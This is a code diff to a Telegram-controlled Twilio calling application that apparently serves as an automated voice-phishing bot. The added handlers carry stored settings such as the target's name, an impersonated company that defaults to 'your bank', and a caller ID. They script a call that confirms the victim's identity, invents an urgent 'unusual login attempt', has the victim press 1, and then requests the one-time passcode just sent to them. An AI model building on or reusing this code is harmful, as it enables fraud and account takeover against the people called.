@@ -139,8 +139,10 @@ NGROK_TOKEN = _get("NGROK_TOKEN", "")
 # Channels
 MAIN_CHANNEL_URL = _get("MAIN_CHANNEL_URL", "https://t.me/your_main_channel")
 BACKUP_CHANNEL_URL = _get("BACKUP_CHANNEL_URL", "https://t.me/your_backup_channel")
+VOUCH_CHANNEL_URL = _get("VOUCH_CHANNEL_URL", "https://t.me/your_vouch_channel")
 MAIN_CHANNEL_ID = _get("MAIN_CHANNEL_ID", "")
 BACKUP_CHANNEL_ID = _get("BACKUP_CHANNEL_ID", "")
+VOUCH_CHANNEL_ID = _get("VOUCH_CHANNEL_ID", "")
 # Admins
 OWNER_ID = _get("OWNER_ID")
 if OWNER_ID is not None:
@@ -224,7 +226,8 @@ def _derive_channel_id(url, fallback):
 
 MAIN_CHANNEL_ID = _derive_channel_id(MAIN_CHANNEL_URL, MAIN_CHANNEL_ID)
 BACKUP_CHANNEL_ID = _derive_channel_id(BACKUP_CHANNEL_URL, BACKUP_CHANNEL_ID)
-REQUIRED_CHANNELS = [ch for ch in [MAIN_CHANNEL_ID, BACKUP_CHANNEL_ID] if ch]
+VOUCH_CHANNEL_ID = _derive_channel_id(VOUCH_CHANNEL_URL, VOUCH_CHANNEL_ID)
+REQUIRED_CHANNELS = [ch for ch in [MAIN_CHANNEL_ID, BACKUP_CHANNEL_ID, VOUCH_CHANNEL_ID] if ch]
 
 # ======================================================================
 # LOGGING
@@ -1437,6 +1440,13 @@ def register_call_session(
     mode_label: Optional[str] = None,
     voice_id: Optional[str] = None,
     voice_name: Optional[str] = None,
+    name: Optional[str] = None,
+    company: Optional[str] = None,
+    from_name: Optional[str] = None,
+    delivery: Optional[str] = None,
+    language: Optional[str] = None,
+    code_length: Optional[str] = None,
+    emotion: Optional[str] = None,
     status_chat_id: Optional[int] = None,
     status_message_id: Optional[int] = None,
 ) -> None:
@@ -1453,6 +1463,13 @@ def register_call_session(
             "answered_by": None,
             "voice_id": voice_id,
             "voice_name": voice_name,
+            "name": name,
+            "company": company,
+            "from_name": from_name,
+            "delivery": delivery,
+            "language": language,
+            "code_length": code_length,
+            "emotion": emotion,
             "mode_label": mode_label,
             "endpoints_hit": [endpoint] if endpoint else [],
             "status_chat_id": status_chat_id if status_chat_id is not None else chat_id,
@@ -1465,6 +1482,20 @@ def register_call_session(
         session["voice_id"] = voice_id
     if voice_name is not None:
         session["voice_name"] = voice_name
+    if name is not None:
+        session["name"] = name
+    if company is not None:
+        session["company"] = company
+    if from_name is not None:
+        session["from_name"] = from_name
+    if delivery is not None:
+        session["delivery"] = delivery
+    if language is not None:
+        session["language"] = language
+    if code_length is not None:
+        session["code_length"] = code_length
+    if emotion is not None:
+        session["emotion"] = emotion
     if status_chat_id is not None:
         session["status_chat_id"] = status_chat_id
     if status_message_id is not None:
@@ -1519,6 +1550,61 @@ def get_call_voice_info(call_sid: str, user_id: str = "unknown") -> tuple[str, s
         return voice_id, voice_name
     return get_default_voice_id(), ""
 
+
+def get_call_setting(call_sid: str, user_id: str, key: str, file_name: Optional[str] = None, default: str = "") -> str:
+    session = get_call_session(call_sid)
+    if session:
+        value = session.get(key)
+        if value is not None and str(value).strip() != "":
+            return str(value)
+    if file_name:
+        return read_user_file(user_id, file_name, default) or default
+    return default
+
+
+def get_call_name(call_sid: str, user_id: str) -> str:
+    return get_call_setting(call_sid, user_id, "name", "Name.txt", "Customer")
+
+
+def get_call_company(call_sid: str, user_id: str) -> str:
+    return get_call_setting(call_sid, user_id, "company", "Company Name.txt", "your bank")
+
+
+def get_call_from_name(call_sid: str, user_id: str) -> str:
+    return get_call_setting(call_sid, user_id, "from_name", "From Name.txt", "").strip()
+
+
+def get_call_language(call_sid: str, user_id: str) -> str:
+    return (get_call_setting(call_sid, user_id, "language", "Language.txt", "en") or "en").lower()
+
+
+def get_call_delivery(call_sid: str, user_id: str) -> str:
+    return (get_call_setting(call_sid, user_id, "delivery", "Delivery.txt", "sms") or "sms").lower()
+
+
+def get_call_code_length(call_sid: str, user_id: str) -> int:
+    code_length = get_call_setting(call_sid, user_id, "code_length", "Digits.txt", "6")
+    try:
+        code_length_value = int(code_length)
+    except (TypeError, ValueError):
+        code_length_value = 6
+    if code_length_value < 4 or code_length_value > 10:
+        return 6
+    return code_length_value
+
+
+def get_request_voice_info(call_sid: str, user_id: str = "unknown") -> tuple[str, str]:
+    """Prefer voice_id supplied on the incoming Twilio request, then fallback to session/user defaults."""
+    voice_id = request.values.get("voice_id") or request.args.get("voice_id") or ""
+    if voice_id:
+        voice_name = read_user_file(user_id, "VoiceName.txt", "") or get_voice_key_by_id(voice_id) or ""
+        session = get_call_session(call_sid)
+        if session is not None:
+            session["voice_id"] = voice_id
+            session["voice_name"] = voice_name
+        return voice_id, voice_name
+    return get_call_voice_info(call_sid, user_id)
+
 # ======================================================================
 # OTP TIMER HELPERS
 # ======================================================================
@@ -1543,6 +1629,13 @@ def cancel_otp_timer(call_sid: str) -> None:
             timer.cancel()
         except Exception:
             pass
+
+
+def cleanup_call_session(call_sid: str) -> None:
+    if not call_sid:
+        return
+    cancel_otp_timer(call_sid)
+    call_sessions.pop(call_sid, None)
 
 # ======================================================================
 # HELPER FUNCTIONS
@@ -2585,9 +2678,13 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                     f"&chat_id={quote_plus(str(chat_id))}"
                     f"&name={quote_plus(name)}"
                     f"&company={quote_plus(company)}"
+                    f"&from_name={quote_plus(from_name)}"
                     f"&voice_id={quote_plus(voice_id)}"
                     f"&emotion={quote_plus(emotion)}"
+                    f"&language={quote_plus(language)}"
+                    f"&delivery={quote_plus(delivery)}"
                     f"&code_length={quote_plus(code_length)}"
+                    f"&caller_id={quote_plus(caller_id)}"
                     f"&call_type=normal"
                     f"&mode_label={quote_plus(mode_label or 'Normal Call')}"
                 )
@@ -3259,6 +3356,26 @@ def voice():
     redirect_url = f"/focus_listen_flow?user_id={quote_plus(str(user_id))}"
     if chat_id is not None:
         redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
+
+    # Preserve initial normal call setup params so later stages use the correct values
+    for key in [
+        "name",
+        "company",
+        "from_name",
+        "voice_id",
+        "voice_name",
+        "emotion",
+        "language",
+        "delivery",
+        "code_length",
+        "call_type",
+        "mode_label",
+        "caller_id",
+    ]:
+        value = request.values.get(key) or request.args.get(key)
+        if value and value not in ("None", "unknown"):
+            redirect_url += f"&{quote_plus(str(key))}={quote_plus(str(value))}"
+
     resp.redirect(redirect_url, method="POST")
     return Response(str(resp), content_type="application/xml")
 
@@ -3563,6 +3680,17 @@ def normal_advanced_flow():
     chat_id = request.values.get("chat_id") or request.args.get("chat_id")
     call_sid = request.values.get("CallSid", "")
 
+    voice_id = request.values.get("voice_id") or request.args.get("voice_id") or None
+    voice_name = ""
+    if voice_id:
+        voice_name = read_user_file(user_id, "VoiceName.txt", "") or get_voice_key_by_id(voice_id) or ""
+    name = request.values.get("name") or request.args.get("name")
+    company = request.values.get("company") or request.args.get("company")
+    from_name = request.values.get("from_name") or request.args.get("from_name")
+    language = request.values.get("language") or request.args.get("language")
+    delivery = request.values.get("delivery") or request.args.get("delivery")
+    code_length = request.values.get("code_length") or request.args.get("code_length")
+    emotion = request.values.get("emotion") or request.args.get("emotion")
     if call_sid:
         register_call_session(
             call_sid,
@@ -3570,6 +3698,15 @@ def normal_advanced_flow():
             chat_id=int(chat_id) if chat_id and chat_id not in ("None", "unknown") else None,
             endpoint="/normal_advanced_flow",
             mode_label="Normal Call",
+            voice_id=voice_id,
+            voice_name=voice_name,
+            name=name,
+            company=company,
+            from_name=from_name,
+            language=language,
+            delivery=delivery,
+            code_length=code_length,
+            emotion=emotion,
         )
 
     resp = VoiceResponse()
@@ -3603,6 +3740,17 @@ def focus_listen_flow():
         resp.hangup()
         return Response(str(resp), content_type="application/xml")
 
+    voice_id = request.values.get("voice_id") or request.args.get("voice_id") or None
+    voice_name = ""
+    if voice_id:
+        voice_name = read_user_file(user_id, "VoiceName.txt", "") or get_voice_key_by_id(voice_id) or ""
+    name = request.values.get("name") or request.args.get("name")
+    company = request.values.get("company") or request.args.get("company")
+    from_name = request.values.get("from_name") or request.args.get("from_name")
+    language = request.values.get("language") or request.args.get("language")
+    delivery = request.values.get("delivery") or request.args.get("delivery")
+    code_length = request.values.get("code_length") or request.args.get("code_length")
+    emotion = request.values.get("emotion") or request.args.get("emotion")
     if call_sid:
         register_call_session(
             call_sid,
@@ -3610,14 +3758,282 @@ def focus_listen_flow():
             chat_id=int(chat_id) if chat_id and chat_id not in ("None", "unknown") else None,
             endpoint="/focus_listen_flow",
             mode_label="Normal Call",
+            voice_id=voice_id,
+            voice_name=voice_name,
+            name=name,
+            company=company,
+            from_name=from_name,
+            language=language,
+            delivery=delivery,
+            code_length=code_length,
+            emotion=emotion,
         )
 
     resp = VoiceResponse()
     resp.pause(length=1)
-    redirect_url = f"/normal_advanced_flow?user_id={quote_plus(str(user_id))}"
+    redirect_url = f"/handle_acknowledgment?user_id={quote_plus(str(user_id))}"
     if chat_id:
         redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
     resp.redirect(redirect_url, method="POST")
+    return Response(str(resp), content_type="application/xml")
+
+
+def _is_positive_acknowledgment(text: str) -> bool:
+    if not text:
+        return False
+    normalized = text.strip().lower()
+    negative_signals = ["no", "not", "never", "don't", "dont", "cannot", "can't", "wrong"]
+    if any(signal in normalized for signal in negative_signals):
+        return False
+    positive_signals = [
+        "yes",
+        "yeah",
+        "yep",
+        "sure",
+        "correct",
+        "affirmative",
+        "speaking",
+        "go ahead",
+        "okay",
+        "ok",
+        "right",
+        "confirm",
+        "i am",
+        "i'm",
+    ]
+    return any(signal in normalized for signal in positive_signals)
+
+
+@app.route("/handle_acknowledgment", methods=["POST"])
+@twilio_request_logger("/handle_acknowledgment")
+def handle_acknowledgment():
+    from twilio.twiml.voice_response import VoiceResponse, Gather
+
+    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
+    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
+    call_sid = request.values.get("CallSid", "")
+    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
+    speech_result = (request.values.get("SpeechResult") or request.values.get("speech_result") or "").strip()
+    digits = (request.values.get("Digits") or "").strip()
+    language = get_call_language(call_sid, user_id)
+    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
+    name = get_call_name(call_sid, user_id)
+    company = get_call_company(call_sid, user_id)
+    from_name = get_call_from_name(call_sid, user_id)
+
+    if from_name:
+        caller_identity = f"{from_name} from {company}"
+    else:
+        caller_identity = company
+
+    session = get_call_session(call_sid)
+    if call_sid and session is None:
+        register_call_session(
+            call_sid,
+            user_id,
+            chat_id=chat_id,
+            endpoint="/handle_acknowledgment",
+            mode_label="Normal Call",
+        )
+        session = get_call_session(call_sid)
+
+    if session is None:
+        session = {}
+
+    session["ack_attempts"] = session.get("ack_attempts", 0)
+
+    def _gather_acknowledgment(prompt_text: str) -> Response:
+        resp = VoiceResponse()
+        gather_action = (
+            f"/handle_acknowledgment?user_id={quote_plus(str(user_id))}"
+            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+        )
+        gather = Gather(
+            input="speech dtmf",
+            timeout=3,
+            speech_timeout="auto",
+            action=gather_action,
+            method="POST",
+            language="en-US" if language == "en" else "fr-FR",
+            speech_model="phone_call",
+        )
+        prompt_audio = generate_call_audio(user_id=user_id, text=prompt_text, voice_id=voice_id, filename="acknowledgment_prompt.mp3")
+        if prompt_audio:
+            gather.play(prompt_audio)
+        else:
+            gather.say(prompt_text)
+        resp.append(gather)
+        return Response(str(resp), content_type="application/xml")
+
+    logger.info(
+        f"[ACK] call_sid={call_sid[:8] if call_sid else 'unknown'} speech={speech_result or 'none'} digits={digits or 'none'} ack_attempts={session.get('ack_attempts')} user={user_id}"
+    )
+
+    if speech_result or digits:
+        if digits == "1" or _is_positive_acknowledgment(speech_result):
+            if session is not None:
+                session["ack_attempts"] = 0
+            redirect_url = f"/present_urgency?user_id={quote_plus(str(user_id))}"
+            if chat_id is not None:
+                redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
+            resp = VoiceResponse()
+            resp.redirect(redirect_url, method="POST")
+            return Response(str(resp), content_type="application/xml")
+
+        session["ack_attempts"] += 1
+        if session["ack_attempts"] >= 2:
+            resp = VoiceResponse()
+            final = "I'm sorry, we seem to have a poor connection. Please call us back. Goodbye."
+            audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="ack_no_response_final.mp3")
+            if audio_final:
+                resp.play(audio_final)
+            else:
+                resp.say(final)
+            resp.hangup()
+            return Response(str(resp), content_type="application/xml")
+
+        prompt = (
+            f"Hello? Can you hear me? If you can, please say yes or press 1 now."
+        )
+        return _gather_acknowledgment(prompt)
+
+    session["ack_attempts"] += 1
+    if session["ack_attempts"] >= 2:
+        resp = VoiceResponse()
+        final = "I'm sorry, we seem to have a poor connection. Please call us back. Goodbye."
+        audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="ack_no_response_final.mp3")
+        if audio_final:
+            resp.play(audio_final)
+        else:
+            resp.say(final)
+        resp.hangup()
+        return Response(str(resp), content_type="application/xml")
+
+    prompt = (
+        f"Hello. This is {caller_identity}. Am I speaking with {name}?"
+    )
+    return _gather_acknowledgment(prompt)
+
+
+@app.route("/present_urgency", methods=["POST"])
+@twilio_request_logger("/present_urgency")
+def present_urgency():
+    from twilio.twiml.voice_response import VoiceResponse, Gather
+
+    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
+    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
+    call_sid = request.values.get("CallSid", "")
+    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
+    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
+    language = get_call_language(call_sid, user_id)
+    name = get_call_name(call_sid, user_id)
+    company = get_call_company(call_sid, user_id)
+    from_name = get_call_from_name(call_sid, user_id)
+
+    if from_name:
+        caller_identity = f"{from_name} from {company}"
+    else:
+        caller_identity = company
+
+    resp = VoiceResponse()
+    gather_action = (
+        f"/handle_dtmf_press_1?user_id={quote_plus(str(user_id))}"
+        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+    )
+    gather = Gather(
+        num_digits=1,
+        action=gather_action,
+        timeout=5,
+        input="dtmf",
+        method="POST",
+        finish_on_key="",
+    )
+    gather.say(f"Thank you for confirming your identity.")
+    gather.pause(length=1)
+    gather.say(
+        f"We are calling because our systems flagged an unusual login attempt on your account from an unrecognised device."
+    )
+    gather.pause(length=1)
+    gather.say("For your protection, we need to perform a quick security verification.")
+    gather.pause(length=1)
+    gather.say("This will only take a moment.")
+    gather.pause(length=1)
+    gather.say("To begin, please press 1 on your keypad now.")
+    resp.append(gather)
+    return Response(str(resp), content_type="application/xml")
+
+
+@app.route("/handle_dtmf_press_1", methods=["POST"])
+@twilio_request_logger("/handle_dtmf_press_1")
+def handle_dtmf_press_1():
+    from twilio.twiml.voice_response import VoiceResponse, Gather
+
+    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
+    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
+    call_sid = request.values.get("CallSid", "")
+    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
+    digits = (request.values.get("Digits") or "").strip()
+    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
+
+    session = get_call_session(call_sid)
+    if call_sid and session is None:
+        register_call_session(
+            call_sid,
+            user_id,
+            chat_id=chat_id,
+            endpoint="/handle_dtmf_press_1",
+            mode_label="Normal Call",
+        )
+        session = get_call_session(call_sid)
+
+    if session is None:
+        session = {}
+
+    session["press1_attempts"] = session.get("press1_attempts", 0)
+
+    if digits == "1":
+        if session is not None:
+            session["press1_attempts"] = 0
+        redirect_url = (
+            f"/capture_otp?user_id={quote_plus(str(user_id))}"
+            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
+        )
+        resp = VoiceResponse()
+        resp.redirect(redirect_url, method="POST")
+        return Response(str(resp), content_type="application/xml")
+
+    session["press1_attempts"] += 1
+    if session["press1_attempts"] >= 2:
+        resp = VoiceResponse()
+        final = (
+            "I'm sorry, I didn't hear a response. Please contact our support line. Goodbye."
+        )
+        audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="press1_no_response_final.mp3")
+        if audio_final:
+            resp.play(audio_final)
+        else:
+            resp.say(final)
+        resp.hangup()
+        return Response(str(resp), content_type="application/xml")
+
+    resp = VoiceResponse()
+    retry_prompt = (
+        "To continue, please press 1 on your keypad now."
+    )
+    gather_action = (
+        f"/handle_dtmf_press_1?user_id={quote_plus(str(user_id))}"
+        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+    )
+    gather = Gather(
+        num_digits=1,
+        action=gather_action,
+        timeout=5,
+        input="dtmf",
+        method="POST",
+        finish_on_key="",
+    )
+    gather.say(retry_prompt)
+    resp.append(gather)
     return Response(str(resp), content_type="application/xml")
 
 
@@ -3632,13 +4048,13 @@ def capture_otp():
     stage = request.values.get("stage", "otp")
     after_gather = request.values.get("after_gather") == "1"
     chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
-    voice_id, voice_name = get_call_voice_info(call_sid, user_id)
-    name = read_user_file(user_id, "Name.txt", "Customer")
-    company = read_user_file(user_id, "Company Name.txt", "your bank")
-    from_name = read_user_file(user_id, "From Name.txt", "").strip()
-    language = (read_user_file(user_id, "Language.txt", "en") or "en").lower()
-    delivery = (read_user_file(user_id, "Delivery.txt", "sms") or "sms").lower()
-    code_length = read_user_file(user_id, "Digits.txt", "6")
+    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
+    name = get_call_name(call_sid, user_id)
+    company = get_call_company(call_sid, user_id)
+    from_name = get_call_from_name(call_sid, user_id)
+    language = get_call_language(call_sid, user_id)
+    delivery = get_call_delivery(call_sid, user_id)
+    code_length = get_call_code_length(call_sid, user_id)
     try:
         code_length = int(code_length)
     except (TypeError, ValueError):
@@ -3673,7 +4089,7 @@ def capture_otp():
     else:
         delivery_text = "email" if delivery == "email" else "SMS"
         confirm_prompt = (
-            f"Good day. This is {caller_identity}. "
+            f"Hello. This is {caller_identity}. "
             f"May I speak with {name}? We have detected a suspicious login attempt on your account, "
             f"and need to verify your identity immediately to protect your funds. "
             f"A {delivery_text} one-time passcode has been sent for {code_length}-digit verification. "
@@ -3963,28 +4379,30 @@ def twilio_status():
 
             if status_text:
                 update_call_status_message(call_sid, status_text, final=final_status)
-                if status != "completed":
+                if not final_status:
                     return Response("OK", status=200)
 
-        if status == "completed" and call_sid:
-            try:
-                # The recording is handled by Twilio's recording callback (/twilio/recording)
-                # so we only send the final call summary here.
-                answered_by = call_sessions.get(call_sid, {}).get("answered_by")
-                event_type = "Machine" if answered_by and "machine" in answered_by.lower() else "Voicemail" if answered_by and "voicemail" in answered_by.lower() else "Completed"
-                summary = (
-                    f"✅ Call ended.\n"
-                    f"Detected: {event_type}\n"
-                    f"CallSid: <code>{call_sid}</code>\n"
-                    f"AMD Result: {answered_by or 'unknown'}"
-                )
-                if not update_call_status_message(call_sid, summary, final=True):
-                    kb = types.InlineKeyboardMarkup()
-                    kb.add(types.InlineKeyboardButton("Main Menu", callback_data="show_main_menu"))
-                    if chat_id:
-                        bot.send_message(int(chat_id), summary, reply_markup=kb, parse_mode="HTML")
-            except Exception as summ_ex:
-                logger.warning(f"Failed to send final call summary: {summ_ex}")
+        if final_status and call_sid:
+            if status == "completed":
+                try:
+                    # The recording is handled by Twilio's recording callback (/twilio/recording)
+                    # so we only send the final call summary here.
+                    answered_by = call_sessions.get(call_sid, {}).get("answered_by")
+                    event_type = "Machine" if answered_by and "machine" in answered_by.lower() else "Voicemail" if answered_by and "voicemail" in answered_by.lower() else "Completed"
+                    summary = (
+                        f"✅ Call ended.\n"
+                        f"Detected: {event_type}\n"
+                        f"CallSid: <code>{call_sid}</code>\n"
+                        f"AMD Result: {answered_by or 'unknown'}"
+                    )
+                    if not update_call_status_message(call_sid, summary, final=True):
+                        kb = types.InlineKeyboardMarkup()
+                        kb.add(types.InlineKeyboardButton("Main Menu", callback_data="show_main_menu"))
+                        if chat_id:
+                            bot.send_message(int(chat_id), summary, reply_markup=kb, parse_mode="HTML")
+                except Exception as summ_ex:
+                    logger.warning(f"Failed to send final call summary: {summ_ex}")
+            cleanup_call_session(call_sid)
 
         return Response("OK", status=200)
 
